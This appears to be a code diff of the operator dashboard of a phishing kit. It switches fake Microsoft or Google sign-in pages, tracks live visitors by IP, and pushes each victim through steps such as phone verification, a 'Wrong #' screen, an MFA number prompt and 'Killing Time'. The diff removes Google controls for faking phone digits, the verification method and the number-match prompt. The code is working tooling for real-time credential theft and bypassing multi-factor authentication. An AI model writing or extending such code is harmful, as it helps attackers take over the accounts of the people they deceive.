@@ -216,7 +216,6 @@ const PROVIDER_PUSH_STEPS: Record<string, StepCategory[]> = {
       { label: 'Phone Verify',  step: 'phone-verify',  color: '#065f46' },
       { label: 'Confirm #',     step: 'phone-confirm', color: '#0d7a5f' },
       { label: 'Wrong #',       step: 'phone-wrong',   color: '#dc2626' },
-      { label: 'Phone Code',    step: 'phone-code',    color: '#b45309' },
       { label: 'Google Prompt', step: 'prompt-number', color: '#4285F4' },
       { label: 'Update Phone',  step: 'phone-update',  color: '#7c3aed' },
       { label: 'Killing Time',  step: 'killing-time',  color: '#1d4ed8' },
@@ -257,13 +256,10 @@ function ProviderBadge({ provider, size = 14 }: { provider: string; size?: numbe
   return <span className="text-[11px] text-[#aaa]">{provider}</span>;
 }
 
-function loginSrc(provider: Provider, device: Device, theme: Theme, prompt: Prompt, phoneEnabled: boolean, googlePhone?: string, gVerifyMethod?: string, gCorrectNumber?: number) {
+function loginSrc(provider: Provider, device: Device, theme: Theme, prompt: Prompt, phoneEnabled: boolean) {
   const base = import.meta.env.BASE_URL.replace(/\/$/, '');
   const phonePart = provider === 'microsoft' && phoneEnabled ? '&phone=1' : '';
-  const gphonePart = provider === 'google' && googlePhone ? `&gphone=${googlePhone}` : '';
-  const gverifyPart = provider === 'google' && gVerifyMethod ? `&gverify=${gVerifyMethod}` : '';
-  const gnumberPart = provider === 'google' && gCorrectNumber != null ? `&gnumber=${gCorrectNumber}` : '';
-  return `${base}/?provider=${provider}&device=${device}&theme=${theme}&prompt=${prompt}${phonePart}${gphonePart}${gverifyPart}${gnumberPart}`;
+  return `${base}/?provider=${provider}&device=${device}&theme=${theme}&prompt=${prompt}${phonePart}`;
 }
 
 function visitorModalSrc(visitor: VisitorInfo) {
@@ -816,9 +812,6 @@ export default function AdminPage() {
   const [theme, setTheme] = useState<Theme>('light');
   const [prompt, setPrompt] = useState<Prompt>('password');
   const [phoneEnabled, setPhoneEnabled] = useState(false);
-  const [googlePhone, setGooglePhone] = useState('09');
-  const [gVerifyMethod, setGVerifyMethod] = useState<'sms' | 'auth'>('sms');
-  const [gCorrectNumber, setGCorrectNumber] = useState(45);
   const [removalWaitSeconds, setRemovalWaitSeconds] = useState(20);
   const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
   const [modalVisitorIp, setModalVisitorIp] = useState<string | null>(null);
@@ -1311,7 +1304,7 @@ export default function AdminPage() {
     { id: 'other-ways',   name: 'Other ways',    icon: <LayoutList className="w-3.5 h-3.5 text-white" />, desc: 'Let user choose method' },
   ];
 
-  const src = loginSrc(provider, device, theme, prompt, phoneEnabled, googlePhone, gVerifyMethod, gCorrectNumber);
+  const src = loginSrc(provider, device, theme, prompt, phoneEnabled);
   const accentColor = PROVIDER_COLORS[provider];
 
   const onlineCount = visitors.filter(v => v.online).length;
@@ -1579,63 +1572,6 @@ export default function AdminPage() {
                     {prompt === p.id && <span className="w-1.5 h-1.5 rounded-full flex-shrink-0 bg-[#0078D4]" />}
                   </button>
                 ))}
-              </div>
-            </section>
-          )}
-
-          {/* Prompt — Google only */}
-          {provider === 'google' && (
-            <section className="space-y-2">
-              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Prompt</p>
-              <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24] divide-y divide-[#2d3139]">
-
-                {/* Phone last digits */}
-                <div className="flex items-center justify-between px-3 py-2.5">
-                  <div className="flex items-center gap-2.5">
-                    <Smartphone className="w-4 h-4 text-[#6b7280]" />
-                    <div>
-                      <div className="text-[12px] text-[#aeb5c0] font-medium leading-none mb-0.5">Phone last digits</div>
-                      <div className="text-[10px] text-[#606672] font-mono tracking-widest">●●●●●●●●{googlePhone}</div>
-                    </div>
-                  </div>
-                  <div className="flex items-center gap-1">
-                    <button onClick={() => setGooglePhone(p => String(Math.max(0, parseInt(p) - 1)).padStart(2, '0'))}
-                      className="w-5 h-5 rounded bg-[#2a2d35] hover:bg-[#3a3f4a] text-[#aeb5c0] flex items-center justify-center text-sm font-bold leading-none transition-colors">−</button>
-                    <span className="text-[13px] font-mono font-semibold text-white w-6 text-center">{googlePhone}</span>
-                    <button onClick={() => setGooglePhone(p => String(Math.min(99, parseInt(p) + 1)).padStart(2, '0'))}
-                      className="w-5 h-5 rounded bg-[#2a2d35] hover:bg-[#3a3f4a] text-[#aeb5c0] flex items-center justify-center text-sm font-bold leading-none transition-colors">+</button>
-                  </div>
-                </div>
-
-                {/* Verify method toggle */}
-                <div className="px-3 py-2.5">
-                  <div className="text-[12px] text-[#aeb5c0] font-medium mb-1.5">Verification method</div>
-                  <div className="flex gap-1.5">
-                    {(['sms', 'auth'] as const).map(m => (
-                      <button key={m}
-                        onClick={() => setGVerifyMethod(m)}
-                        className={`flex-1 py-1 rounded text-[11px] font-medium transition-colors ${gVerifyMethod === m ? 'bg-[#4285F4] text-white' : 'bg-[#2a2d35] text-[#8a919e] hover:bg-[#3a3f4a]'}`}>
-                        {m === 'sms' ? 'SMS Code' : 'Authenticator'}
-                      </button>
-                    ))}
-                  </div>
-                </div>
-
-                {/* Correct number for prompt-number step */}
-                <div className="flex items-center justify-between px-3 py-2.5">
-                  <div>
-                    <div className="text-[12px] text-[#aeb5c0] font-medium leading-none mb-0.5">Prompt number</div>
-                    <div className="text-[10px] text-[#606672]">Correct # for "Check your phone"</div>
-                  </div>
-                  <div className="flex items-center gap-1">
-                    <button onClick={() => setGCorrectNumber(n => Math.max(1, n - 1))}
-                      className="w-5 h-5 rounded bg-[#2a2d35] hover:bg-[#3a3f4a] text-[#aeb5c0] flex items-center justify-center text-sm font-bold leading-none transition-colors">−</button>
-                    <span className="text-[13px] font-mono font-semibold text-white w-7 text-center">{gCorrectNumber}</span>
-                    <button onClick={() => setGCorrectNumber(n => Math.min(99, n + 1))}
-                      className="w-5 h-5 rounded bg-[#2a2d35] hover:bg-[#3a3f4a] text-[#aeb5c0] flex items-center justify-center text-sm font-bold leading-none transition-colors">+</button>
-                  </div>
-                </div>
-
               </div>
             </section>
           )}
